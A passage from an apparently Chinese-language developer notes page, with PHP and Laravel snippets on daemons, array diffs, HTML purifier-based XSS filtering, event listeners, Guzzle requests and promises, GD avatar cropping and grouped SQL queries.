class="string">'start'</span>:</span><br><span class="line">                $<span class="keyword">this</span>-&gt;start();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'stop'</span>:</span><br><span class="line">                $<span class="keyword">this</span>-&gt;stop();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'status'</span>:</span><br><span class="line">                $<span class="keyword">this</span>-&gt;status();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                echo <span class="string">"Argv start|stop|status "</span> . PHP_EOL;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$deamon = <span class="keyword">new</span> \Deamon();</span><br><span class="line">$deamon-&gt;run($argv);</span><br><span class="line">开启守护进程：php demon.php start</span><br><span class="line">停止守护进程：php demon.php stop</span><br><span class="line">查看守护进程的状态：php demon.php status</span><br></pre></td></tr></table></figure>
<h3 id="laravel获取记录的原始属性"><a href="#laravel获取记录的原始属性" class="headerlink" title="laravel获取记录的原始属性"></a>laravel获取记录的原始属性</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$user = App\User::first();</span><br><span class="line">$user-&gt;name;                   <span class="comment">//John</span></span><br><span class="line"></span><br><span class="line">$user-&gt;name = <span class="string">"Peter"</span>;         <span class="comment">//Peter</span></span><br><span class="line"></span><br><span class="line">$user-&gt;getOriginal(<span class="string">'name'</span>);    <span class="comment">//John</span></span><br><span class="line">$user-&gt;getOriginal();          <span class="comment">//原始 $user 记录</span></span><br></pre></td></tr></table></figure>
<h3 id="获取重复值"><a href="#获取重复值" class="headerlink" title="获取重复值"></a>获取重复值</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取去掉重复数据的数组</span></span><br><span class="line">$a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">6</span>];</span><br><span class="line">$uniqueArr = array_unique ($a);</span><br><span class="line"><span class="comment">// 获取重复数据的数组 array_diff_assoc() 返回一个数组，该数组包括了所有在 array1 中但是不在任何其它参数数组中的值。注意和 array_diff() 不同的是键名也用于比较。</span></span><br><span class="line">$repeatArr = array_diff_assoc ($a,$uniqueArr);</span><br><span class="line">var_dump($repeatArr);</span><br><span class="line">结果：</span><br><span class="line">array(<span class="number">2</span>) &#123;</span><br><span class="line">  [<span class="number">6</span>]=&gt;</span><br><span class="line">  int(<span class="number">3</span>)</span><br><span class="line">  [<span class="number">7</span>]=&gt;</span><br><span class="line">  int(<span class="number">6</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="表限制"><a href="#表限制" class="headerlink" title="表限制"></a>表限制</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">表数据限制：</span><br><span class="line"><span class="number">1</span>、Excel <span class="number">2003</span>及以下的版本。一张表最大支持<span class="number">65536</span>行数据，<span class="number">256</span>列。</span><br><span class="line"><span class="number">2</span>、Excel <span class="number">2007</span><span class="number">-2010</span>版本。一张表最大支持<span class="number">1048576</span>行，<span class="number">16384</span>列。</span><br><span class="line">https:<span class="comment">//laravel-china.org/articles/22724 </span></span><br><span class="line">也就是说你想几百万条轻轻松松一次性导入一张EXCEL表是不行的，你起码需要进行数据分割，保证数据不能超过<span class="number">104</span>W一张表。</span><br><span class="line"></span><br><span class="line">PHPexcel内存溢出：</span><br><span class="line">既然数据限制在<span class="number">104</span>W，那么数据分割就数据分割呗，于是你尝试<span class="number">50</span>W一次导入表，然而PHPexcel内部有函数报内存溢出错误，然后你就不断的调小数据量，直到<span class="number">5</span>W一次导入你都会发现有内存溢出错误。</span><br></pre></td></tr></table></figure>
<h3 id="带索引检查计算数组的差集"><a href="#带索引检查计算数组的差集" class="headerlink" title="带索引检查计算数组的差集"></a>带索引检查计算数组的差集</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$array1 = array(<span class="string">"a"</span> =&gt; <span class="string">"green"</span>, <span class="string">"b"</span> =&gt; <span class="string">"brown"</span>, <span class="string">"c"</span> =&gt; <span class="string">"blue"</span>, <span class="string">"red"</span>);</span><br><span class="line">$array2 = array(<span class="string">"a"</span> =&gt; <span class="string">"green"</span>, <span class="string">"yellow"</span>, <span class="string">"red"</span>);</span><br><span class="line"></span><br><span class="line">$result = array_diff_assoc($array1, $array2);</span><br><span class="line"></span><br><span class="line">print_r($result); <span class="comment">// 输出：["b" =&gt; "brown", "c" =&gt; "blue", 0 =&gt; "red"]</span></span><br><span class="line"><span class="comment">// 大家可以发现这里 red 有输出，为啥呢，因为第二个数组中 red 的 key 为 1。与数组一中的 key 为 0，不一致，所以有输出。https://laravel-china.org/articles/22678</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Laravel</span></span><br><span class="line"></span><br><span class="line">        $array1 = collect([</span><br><span class="line">            <span class="string">"a"</span> =&gt; <span class="string">"green"</span>,</span><br><span class="line">            <span class="string">"b"</span> =&gt; <span class="string">"brown"</span>,</span><br><span class="line">            <span class="string">"c"</span> =&gt; <span class="string">"blue"</span>, <span class="string">"red"</span></span><br><span class="line">        ]);</span><br><span class="line">        $array2 = [</span><br><span class="line">            <span class="string">"a"</span> =&gt; <span class="string">"green"</span>,</span><br><span class="line">            <span class="string">"yellow"</span>, <span class="string">"red"</span></span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $array1-&gt;diffAssoc($array2);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Result </span></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"0"</span>: <span class="string">"red"</span>,</span><br><span class="line"><span class="string">"b"</span>: <span class="string">"brown"</span>,</span><br><span class="line"><span class="string">"c"</span>: <span class="string">"blue"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="过滤xss"><a href="#过滤xss" class="headerlink" title="过滤xss"></a>过滤xss</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ composer <span class="built_in">require</span> <span class="string">"mews/purifier:~2.0"</span></span><br><span class="line">$ php artisan vendor:publish --provider=<span class="string">"Mews\Purifier\PurifierServiceProvider"</span></span><br><span class="line">$topic-&gt;body = clean($topic-&gt;body, <span class="string">'default'</span>);</span><br></pre></td></tr></table></figure>
<h3 id="laravel事件队列"><a href="#laravel事件队列" class="headerlink" title="laravel事件队列"></a>laravel事件队列</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   namespace App\Htt\Controllers;</span><br><span class="line">   use Illuminate\Http\Request;</span><br><span class="line">   <span class="comment">//我们先引入一个事件类，名字自定义的，之后再一步一步创建</span></span><br><span class="line">   use App\Events\Register;</span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class">   </span>&#123;</span><br><span class="line">       public <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params">Request $request</span>)</span></span><br><span class="line"><span class="function">       </span>&#123;</span><br><span class="line">           <span class="comment">//获取参数</span></span><br><span class="line">           <span class="comment">//验证参数</span></span><br><span class="line">           <span class="comment">//写入数据库</span></span><br><span class="line">           <span class="comment">//触发事件，以后所有需要注册后要做的事情，都不需要再这里加代码了，我们只需要管理事件就好了</span></span><br><span class="line">           <span class="comment">//event方法是laravel自带方法, $uid是外部参数，看你需要做什么，传什么参数了。注册之后肯定有$uid的嘛</span></span><br><span class="line">           event(<span class="keyword">new</span> Register($uid));</span><br><span class="line">           <span class="comment">//return 注册信息</span></span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">    &lt;?php</span><br><span class="line"> </span><br><span class="line">       namespace App\Providers;</span><br><span class="line">       use Laravel\Lumen\Providers\EventServiceProvider <span class="keyword">as</span> ServiceProvider</span><br><span class="line">       <span class="class"><span class="keyword">class</span> <span class="title">EventServiceProvider</span> <span class="keyword">extends</span> <span class="title">ServiceProvider</span></span></span><br><span class="line"><span class="class">       </span>&#123;</span><br><span class="line"></span><br><span class="line">           protected $listen = [</span><br><span class="line">               <span class="comment">// 用户注册后的事件</span></span><br><span class="line">               <span class="string">'App\Events\Register'</span> =&gt; [</span><br><span class="line">                   <span class="comment">// 发送广告邮件</span></span><br><span class="line">                   <span class="string">'App\Listeners\SendAdMail'</span>,</span><br><span class="line">                   <span class="comment">// 发送短信</span></span><br><span class="line">                   <span class="string">'App\Listeners\SendSms'</span>,</span><br><span class="line">                   <span class="comment">// 发送帮助信息</span></span><br><span class="line">                   <span class="string">'App\Listeners\SendHelpInformation'</span>,</span><br><span class="line">   </span><br><span class="line">               ],</span><br><span class="line">           ];</span><br><span class="line">       &#125;</span><br><span class="line">        &lt;?php</span><br><span class="line">       </span><br><span class="line">           namespace App\Events;</span><br><span class="line">       </span><br><span class="line">           <span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line"><span class="class">           </span>&#123;</span><br><span class="line">       </span><br><span class="line">               public $uid;</span><br><span class="line">       </span><br><span class="line">               <span class="comment">/**</span></span><br><span class="line"><span class="comment">                * 创建一个新的事件实例.</span></span><br><span class="line"><span class="comment">                *</span></span><br><span class="line"><span class="comment">                * @param  Order  $order</span></span><br><span class="line"><span class="comment">                * @return void</span></span><br><span class="line"><span class="comment">                */</span></span><br><span class="line">               public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$uid</span>)</span></span><br><span class="line"><span class="function">               </span>&#123;</span><br><span class="line">                   $<span class="keyword">this</span>-&gt;uid = $uid;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">            &lt;?php</span><br><span class="line">           </span><br><span class="line">               namespace App\Listeners;</span><br><span class="line">           </span><br><span class="line">               use App\Events\Register;</span><br><span class="line">               use App\Models\User;</span><br><span class="line">               use Illuminate\Contracts\Queue\ShouldQueue;</span><br><span class="line">           </span><br><span class="line">               <span class="class"><span class="keyword">class</span> <span class="title">SendHelpInformation</span> <span class="title">implements</span> <span class="title">ShouldQueue</span></span></span><br><span class="line"><span class="class">               </span>&#123;</span><br><span class="line">           </span><br><span class="line">                   public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">                   </span>&#123;</span><br><span class="line">                       <span class="comment">//</span></span><br><span class="line">                   &#125;</span><br><span class="line">           </span><br><span class="line">                   public <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params">Register $event</span>)</span></span><br><span class="line"><span class="function">                   </span>&#123;</span><br><span class="line">                       $uid = $event-&gt;uid;</span><br><span class="line">           </span><br><span class="line">                       $user = User::find($uid);</span><br><span class="line">           </span><br><span class="line">                       <span class="comment">//......各种实现</span></span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br></pre></td></tr></table></figure>
<h3 id="guzzle上传图片"><a href="#guzzle上传图片" class="headerlink" title="guzzle上传图片"></a>guzzle上传图片</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$client = <span class="keyword">new</span> \GuzzleHttp\Client();</span><br><span class="line">        $body = fopen(<span class="string">'/home/summer/图片/dog1.jpg'</span>, <span class="string">'r'</span>);<span class="comment">//https://laravel-china.org/articles/22813?#reply79441</span></span><br><span class="line">        $response = $client-&gt;request(<span class="string">'POST'</span>, <span class="string">'http://account.chr.test/upload'</span>,</span><br><span class="line">            [</span><br><span class="line">                <span class="string">'multipart'</span> =&gt; [</span><br><span class="line">                    [</span><br><span class="line">                        <span class="string">'name'</span> =&gt; <span class="string">'body'</span>,</span><br><span class="line">                        <span class="string">'contents'</span> =&gt; fopen(<span class="string">'/home/summer/图片/dog1.jpg'</span>, <span class="string">'r'</span>)</span><br><span class="line">                    ],</span><br><span class="line">                ]</span><br><span class="line">            ]</span><br><span class="line">        );</span><br><span class="line">        dump($response-&gt;getStatusCode());   #打印响应信息</span><br><span class="line">        dump($response-&gt;getBody());</span><br><span class="line">        dump(json_decode($response-&gt;getBody()-&gt;getContents()));   #输出结果</span><br></pre></td></tr></table></figure>
<h3 id="guzzle"><a href="#guzzle" class="headerlink" title="guzzle"></a>guzzle</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://media.readthedocs.org/pdf/guzzle/5.3/guzzle.pdf</span></span><br><span class="line">use GuzzleHttp\Event\EmitterInterface;</span><br><span class="line">use GuzzleHttp\Event\SubscriberInterface;</span><br><span class="line">use GuzzleHttp\Event\BeforeEvent;</span><br><span class="line">use GuzzleHttp\Event\CompleteEvent;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SimpleSubscriber</span> <span class="title">implements</span> <span class="title">SubscriberInterface</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">getEvents</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line"><span class="comment">// Provide name and optional priority</span></span><br><span class="line"><span class="string">'before'</span> =&gt; [<span class="string">'onBefore'</span>, <span class="number">100</span>],</span><br><span class="line"><span class="string">'complete'</span> =&gt; [<span class="string">'onComplete'</span>],</span><br><span class="line"><span class="comment">// You can pass a list of listeners with different priorities</span></span><br><span class="line"><span class="string">'error'</span> =&gt; [[<span class="string">'beforeError'</span>, <span class="string">'first'</span>], [<span class="string">'afterError'</span>, <span class="string">'last'</span>]]</span><br><span class="line">];</span><br><span class="line">&#125;</span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">onBefore</span>(<span class="params">BeforeEvent $event, $name</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">echo <span class="string">'Before!'</span>;</span><br><span class="line">&#125;</span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">onComplete</span>(<span class="params">CompleteEvent $event, $name</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">echo <span class="string">'Complete!'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$client = <span class="keyword">new</span> GuzzleHttp\Client();</span><br><span class="line">$emitter = $client-&gt;getEmitter();</span><br><span class="line">$subscriber = <span class="keyword">new</span> SimpleSubscriber();</span><br><span class="line">$emitter-&gt;attach($subscriber);</span><br><span class="line"><span class="comment">//to remove the listeners</span></span><br><span class="line">$emitter-&gt;detach($subscriber);</span><br><span class="line">use GuzzleHttp\Client;</span><br><span class="line">use GuzzleHttp\Event\EmitterInterface;</span><br><span class="line">use GuzzleHttp\Event\BeforeEvent;</span><br><span class="line">$client = <span class="keyword">new</span> Client([<span class="string">'base_url'</span> =&gt; <span class="string">'http://httpbin.org'</span>]);</span><br><span class="line">$request = $client-&gt;createRequest(<span class="string">'GET'</span>, <span class="string">'/'</span>);</span><br><span class="line">$request-&gt;getEmitter()-&gt;on(</span><br><span class="line"><span class="string">'before'</span>,</span><br><span class="line"><span class="function"><span class="keyword">function</span> (<span class="params">BeforeEvent $e, $name</span>) </span>&#123;</span><br><span class="line">echo $name . <span class="string">"\n"</span>;</span><br><span class="line"><span class="comment">// "before"</span></span><br><span class="line">echo $e-&gt;getRequest()-&gt;getMethod() . <span class="string">"\n"</span>;</span><br><span class="line"><span class="comment">// "GET" / "POST" / "PUT" / etc.</span></span><br><span class="line">echo get_class($e-&gt;getClient());</span><br><span class="line"><span class="comment">// "GuzzleHttp\Client"</span></span><br><span class="line">&#125;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">json_decode</span>(<span class="params">$json, $assoc = false, $depth = <span class="number">512</span>, $options = <span class="number">0</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $data = \json_decode($json, $assoc, $depth, $options);</span><br><span class="line">    <span class="keyword">if</span> (JSON_ERROR_NONE !== json_last_error()) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \InvalidArgumentException(</span><br><span class="line">            <span class="string">'json_decode error: '</span> . json_last_error_msg()</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//learnku.com/laravel/t/3553/how-to-read-the-json-data-in-the-response-response-to-guzzle</span></span><br><span class="line">\Guzzle\json_decode( (string) $response-&gt;getBody(), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">GuzzleHttp\<span class="built_in">Promise</span>是对Promises/A+的一个实现。</span><br><span class="line">实现功能有：</span><br><span class="line"><span class="number">1.</span>异步链式执行。</span><br><span class="line"><span class="number">2.</span>cancel操作(<span class="built_in">Promise</span>状态仍然处于pending时)</span><br><span class="line"><span class="number">3.</span>wait同步链式执行</span><br><span class="line">echo <span class="string">'step1'</span>;</span><br><span class="line">$promise = <span class="keyword">new</span> \GuzzleHttp\<span class="built_in">Promise</span>\<span class="built_in">Promise</span>();</span><br><span class="line">$promise-&gt;resolve(<span class="string">'step 3");</span></span><br><span class="line"><span class="string">$promise-&gt;then(function($param)&#123;echo $param;&#125;);</span></span><br><span class="line"><span class="string">echo '</span>step2<span class="string">';</span></span><br><span class="line"><span class="string">// 执行顺序</span></span><br><span class="line"><span class="string">step1</span></span><br><span class="line"><span class="string">step2</span></span><br><span class="line"><span class="string">step3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$promise-&gt;then(function($param)&#123;echo $param; return $param."1";&#125;)</span></span><br><span class="line"><span class="string">-&gt;then(function($param)&#123;echo $param."2";&#125;)</span></span><br><span class="line"><span class="string">-&gt;then(function($param)&#123;echo $param."3";&#125;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">echo '</span>step1<span class="string">';</span></span><br><span class="line"><span class="string">$promise = new \GuzzleHttp\Promise\Promise();</span></span><br><span class="line"><span class="string">$promise-&gt;resolve('</span>step <span class="number">3</span><span class="string">");</span></span><br><span class="line"><span class="string">$promise-&gt;then(function($param)&#123;echo $param;&#125;)-&gt;wait();</span></span><br><span class="line"><span class="string">echo 'step2';</span></span><br><span class="line"><span class="string">// 执行顺序https://www.jianshu.com/p/c3bad948a905</span></span><br><span class="line"><span class="string">step1</span></span><br><span class="line"><span class="string">step3 (会阻塞执行，直到step3执行结束才会执行后续的step2)</span></span><br><span class="line"><span class="string">step2</span></span><br><span class="line"><span class="string">promise基本原理是一系列回调函数入队列，而出队列的函数注册到php脚本结束是运行的register_shutdown_function函数中。</span></span><br><span class="line"><span class="string">因此，所有的promise都是入队列，脚本执行结束再执行；如果脚本执行结束之前，有E_ERROR级别错误，promise不会执行。</span></span><br></pre></td></tr></table></figure>
<h3 id="基于-GD-库生成圆形头像"><a href="#基于-GD-库生成圆形头像" class="headerlink" title="基于 GD 库生成圆形头像"></a>基于 GD 库生成圆形头像</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 获取圆</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   * @param $imgPath 图片网络路径, 本地路径</span></span><br><span class="line"><span class="comment">   * @return resource</span></span><br><span class="line"><span class="comment">   * @author 19/1/29 CLZ.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  private <span class="function"><span class="keyword">function</span> <span class="title">_circleImg</span>(<span class="params">$imgPath</span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      $src_img = imagecreatefromjpeg($imgPath);</span><br><span class="line"></span><br><span class="line">      list($w, $h) = getimagesize($imgPath);</span><br><span class="line">      $w           = $h = min($w, $h);</span><br><span class="line">      $img         = imagecreatetruecolor($w, $h);</span><br><span class="line">      imagesavealpha($img, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 拾取一个完全透明的颜色,最后一个参数127为全透明</span></span><br><span class="line">      $bg = imagecolorallocatealpha($img, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">127</span>);</span><br><span class="line"></span><br><span class="line">      imagefill($img, <span class="number">0</span>, <span class="number">0</span>, $bg);</span><br><span class="line">      $r = $w / <span class="number">2</span>; <span class="comment">// 圆的半径</span></span><br><span class="line">      <span class="keyword">for</span> ($x = <span class="number">0</span>; $x &lt; $w; $x++) &#123;</span><br><span class="line">          <span class="keyword">for</span> ($y = <span class="number">0</span>; $y &lt; $h; $y++) &#123;</span><br><span class="line">              $rgbColor = imagecolorat($src_img, $x, $y);</span><br><span class="line">              <span class="keyword">if</span> (((($x - $r) * ($x - $r) + ($y - $r) * ($y - $r)) &lt; ($r * $r)))</span><br><span class="line">                  imagesetpixel($img, $x, $y, $rgbColor);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      imagedestroy($src_img);</span><br><span class="line">      <span class="keyword">return</span> $img;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h3 id="Laravel-分组获取最新记录"><a href="#Laravel-分组获取最新记录" class="headerlink" title="Laravel 分组获取最新记录"></a>Laravel 分组获取最新记录</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://learnku.com/articles/20626</span></span><br><span class="line">select * <span class="keyword">from</span> (select * <span class="keyword">from</span> project where user_id = :user_id order by id desc) <span class="keyword">as</span> a group by a.name order by id desc;</span><br><span class="line">原因是 <span class="number">5.7</span> 版本 ORDER BY 没有 LIMIT 的时候，少了一个 DERIVED 操作，估计是内部优化了，认为 ORDER BY 在这种语法中可忽略，有 LIMIT 限制涉及排序后的结果，不会忽略 ORDER BY，可以达到预期。</span><br><span class="line">select * <span class="keyword">from</span> (select * <span class="keyword">from</span> project where user_id = :user_id order by id desc limit <span class="number">10000</span>) <span class="keyword">as</span> a group by a.name order by id desc;</span><br><span class="line">$limit = $request-&gt;get(<span class="string">'limit'</span>,<span class="number">10</span>);</span><br><span class="line">        $user_id = $request-&gt;get(<span class="string">'user_id'</span>,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        $sub_query = Project::where(<span class="string">'user_id'</span>,$user_id)-&gt;orderBy(<span class="string">'id'</span>,<span class="string">'desc'</span>)-&gt;limit(<span class="number">1000</span>);<span class="comment">//子查询</span></span><br><span class="line"></span><br><span class="line">        $results = Project::select(<span class="string">'*'</span>)</span><br><span class="line">                -&gt;<span class="keyword">from</span>(DB::raw(<span class="string">'('</span>.$sub_query-&gt;toSql().<span class="string">') as a'</span>)) <span class="comment">//from() 类似与 DB::table(), toSql()得到带 ? 号的执行 sql 语句</span></span><br><span class="line">                